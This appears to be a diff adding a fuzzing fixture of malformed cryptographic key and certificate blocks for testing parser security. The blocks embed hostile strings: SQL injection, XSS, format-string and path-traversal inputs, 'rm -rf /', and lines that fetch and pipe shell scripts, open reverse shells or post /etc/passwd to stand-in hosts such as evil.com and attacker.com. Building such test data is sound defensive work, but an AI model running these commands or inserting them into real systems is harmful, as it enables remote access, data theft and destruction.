@@ -1,0 +1,207 @@
+
+# Enhanced Malformed Cryptographic Key Test Cases
+# Comprehensive collection of malformed keys with various attack patterns
+# for crypto parsing fuzzing and security testing
+
+# RSA Private Key with Invalid Base64 and Multiple Injection Attacks
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA7Q8Z9FN3+InvalidBase64!@#$%^&*()
+Malformed key with null bytes: \x00\x01\x02\x03
+Injected payload: '; DROP TABLE private_keys; --
+Command injection: $(rm -rf /)
+Path traversal: ../../../etc/passwd
+XSS payload: <script>alert('crypto_xss')</script>
+LDAP injection: (&(objectClass=rsaKey)(|(cn=admin)(cn=root)))
+XPath injection: ' or '1'='1
+-----END RSA PRIVATE KEY-----
+
+# RSA Private Key with Excessive Length (DoS Attack)
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA7Q8Z9FN3+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+-----END RSA PRIVATE KEY-----
+
+# Certificate with Malformed ASN.1 and Comprehensive Injections
+-----BEGIN CERTIFICATE-----
+MIIFCjCCAvGgAwIBAgIRANInvalid+Base64==!@#$%^&*()
+Malformed ASN.1 with injection: <script>alert('xss')</script>
+SQL injection: '; DROP TABLE certificates; --
+Command injection: `cat /etc/passwd`
+LDAP injection: (&(objectClass=certificate)(cn=*)(|(sn=admin)(sn=root)))
+XPath injection: ' or '1'='1
+OS command injection: $(curl http://evil.com/cert)
+-----END CERTIFICATE-----
+
+# PKCS#8 Private Key with Format String and Memory Attacks
+-----BEGIN PRIVATE KEY-----
+MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC
+Incomplete PKCS#8 key with format string: %s%x%n%p
+Buffer overflow: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Stack overflow: %08x%08x%08x%08x%08x%08x%08x%08x%08x%08x
+Heap corruption: \x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43
+Unicode injection: 🔐🚀💥
+Zero-width characters: test​‍‍data
+-----END PRIVATE KEY-----
+
+# EC Private Key with Cryptographic Attacks
+-----BEGIN EC PRIVATE KEY-----
+MHcCAQEEIBInvalid+Base64==!@#$%^&*()
+Malformed EC key with null bytes: \x00\x00\x00
+SQL injection: '; DROP TABLE ec_keys; --
+Path traversal: ../../../.ssh/id_rsa
+Command injection: $(curl http://evil.com/shell | bash)
+Weak curve parameters: secp256r1 with backdoor
+Invalid point coordinates: x=0, y=0
+-----END EC PRIVATE KEY-----
+
+# OpenSSH Private Key with Advanced Command Injection
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdG9rInvalid+Base64==!@#$%^&*()
+Malformed OpenSSH key with injection: $(nc -e /bin/sh attacker.com 4444)
+Command injection: `wget http://evil.com/shell.sh -O /tmp/shell && chmod +x /tmp/shell`
+Reverse shell: bash -i >& /dev/tcp/evil.com/4444 0>&1
+Privilege escalation: sudo -u root bash -c 'cat /root/.bashrc'
+Data exfiltration: curl -d "$(cat /etc/passwd)" http://evil.com/steal
+-----END OPENSSH PRIVATE KEY-----
+
+# DSA Private Key with Format String Vulnerabilities
+-----BEGIN DSA PRIVATE KEY-----
+MIIDVQIBAAKCAQEA7Q8Z9FN3+InvalidBase64!@#$%^&*()
+Malformed DSA key with format string: %n%n%n%n
+Buffer overflow pattern: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Memory leak pattern: %08x%08x%08x%08x
+Arbitrary read: %s%s%s%s
+Arbitrary write: %n%n%n%n
+Stack leak: %x%x%x%x
+-----END DSA PRIVATE KEY-----
+
+# PGP Private Key with Malformed Armor and Injections
+-----BEGIN PGP PRIVATE KEY BLOCK-----
+Invalid PGP armor with comprehensive injection attacks
+Version: Malicious PGP Version
+Comment: '; DROP TABLE pgp_keys; --
+
+InvalidBase64WithInjections!@#$%^&*()
+<script>alert('pgp_xss')</script>
+$(rm -rf /)
+../../../etc/passwd
+../../../.gnupg/secring.gpg
+' OR 1=1 --
+$(curl http://evil.com/pgp_exploit)
+-----END PGP PRIVATE KEY BLOCK-----
+
+# X.509 Certificate with ASN.1 and Protocol Vulnerabilities
+-----BEGIN CERTIFICATE-----
+MIIFCjCCAvGgAwIBAgIRANInvalidASN1Data==!@#$%^&*()
+ASN.1 injection: <script>alert('asn1_xss')</script>
+SQL injection: '; DROP TABLE x509_certs; --
+LDAP injection: (&(objectClass=certificate)(cn=*)(|(sn=admin)(sn=root)))
+XPath injection: ' or '1'='1
+Command injection: `openssl req -new -key /dev/null`
+Path traversal: ../../../etc/ssl/certs/ca-bundle.crt
+-----END CERTIFICATE-----
+
+# PKCS#12 Key Store with Malformed PFX and Backdoors
+-----BEGIN PKCS12-----
+Malformed PFX with comprehensive attack vectors
+SQL injection: '; DROP TABLE pkcs12_keys; --
+Command injection: $(openssl pkcs12 -info -in /dev/null)
+Path traversal: ../../../etc/ssl/private.p12
+XSS: <script>alert('pkcs12_xss')</script>
+Weak password: password123
+Backdoored certificate chain
+-----END PKCS12-----
+
+# Ed25519 Private Key with Curve-Specific Attacks
+-----BEGIN ED25519 PRIVATE KEY-----
+Invalid Ed25519 key with malformed curve parameters
+SQL injection: '; DROP TABLE ed25519_keys; --
+Command injection: $(ed25519-tool generate)
+Buffer overflow: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Format string: %s%s%s%n%n%n
+Invalid scalar: 0x00...00
+Weak random generation: 0x11...11
+-----END ED25519 PRIVATE KEY-----
+
+# Certificate Signing Request with Injection Attacks
+-----BEGIN CERTIFICATE REQUEST-----
+MIICsTCCAZkCAQAwbzELMAkGA1UEBhMCVVMxEzARBgNVBAgMCkNhbGlmb3Ju
+aWEMalformedCSRWithInjections!@#$%^&*()
+SQL injection: '; DROP TABLE csrs; --
+XSS payload: <script>alert('csr_xss')</script>
+Command injection: $(openssl req -verify -in /dev/null)
+Path traversal: ../../../etc/ssl/csr.pem
+LDAP injection: (&(objectClass=csr)(cn=malicious))
+-----END CERTIFICATE REQUEST-----
+
+# SSH Public Key with Malformed Format and Attacks
+-----BEGIN SSH PUBLIC KEY-----
+Invalid SSH public key format with injection attacks
+SQL injection: '; DROP TABLE ssh_keys; --
+Command injection: `ssh-keygen -f /dev/null`
+Path traversal: ../../../.ssh/authorized_keys
+Malformed base64: InvalidBase64WithInjections!@#$%^&*()
+XSS: <script>alert('ssh_xss')</script>
+Command injection: $(ssh attacker@evil.com)
+-----END SSH PUBLIC KEY-----
+
+# JWT Token with Algorithm Confusion and Injections
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.InvalidSignatureWithInjections
+Algorithm confusion: {"alg":"none"}
+SQL injection in payload: '; DROP TABLE jwt_tokens; --
+XSS in payload: <script>alert('jwt_xss')</script>
+Command injection: $(curl http://evil.com/jwt_exploit)
+Path traversal: ../../../etc/passwd
+Weak secret: secret123
+-----END JWT TOKEN-----
+
+# Malformed Binary Key (DER Format) with Memory Attacks
+-----BEGIN DER KEY-----
+InvalidDERFormatWithNullBytes\x00\x01\x02\x03\xff\xfe\xfd
+SQL injection: '; DROP TABLE der_keys; --
+Buffer overflow pattern: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Heap corruption: \x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43
+Stack overflow: %08x%08x%08x%08x%08x%08x%08x%08x%08x%08x
+Integer overflow: 2147483648
+-----END DER KEY-----
+
+# Quantum-Safe Key with Malformed Parameters
+-----BEGIN FALCON PRIVATE KEY-----
+Invalid Falcon key with malformed lattice parameters
+SQL injection: '; DROP TABLE falcon_keys; --
+Command injection: $(falcon-keygen --invalid-params)
+Buffer overflow: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Invalid polynomial: x^2 + 1 with malformed coefficients
+Weak parameters: n=512, q=12289 with backdoor
+Side-channel timing attack vector
+-----END FALCON PRIVATE KEY-----
+
+# Homomorphic Encryption Key with Weak Parameters
+-----BEGIN FHE PRIVATE KEY-----
+Weak FHE parameters with cryptographic backdoor
+SQL injection: '; DROP TABLE fhe_keys; --
+Command injection: $(fhe-keygen --weak-params)
+Backdoored modulus: 1234567890abcdef1234567890abcdef
+Weak randomness: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Timing attack vulnerability
+Power analysis vulnerability
+-----END FHE PRIVATE KEY-----
+
+# Malformed AES Key with Side-Channel Attack Vectors
+-----BEGIN AES KEY-----
+InvalidAESKeyWithSideChannelAttacks
+SQL injection: '; DROP TABLE aes_keys; --
+Weak key pattern: 00000000000000000000000000000000
+Known weak key: ffff0000000000000000000000000000
+Cache timing attack vector
+Branch prediction attack vector
+Power analysis attack vector
+-----END AES KEY-----
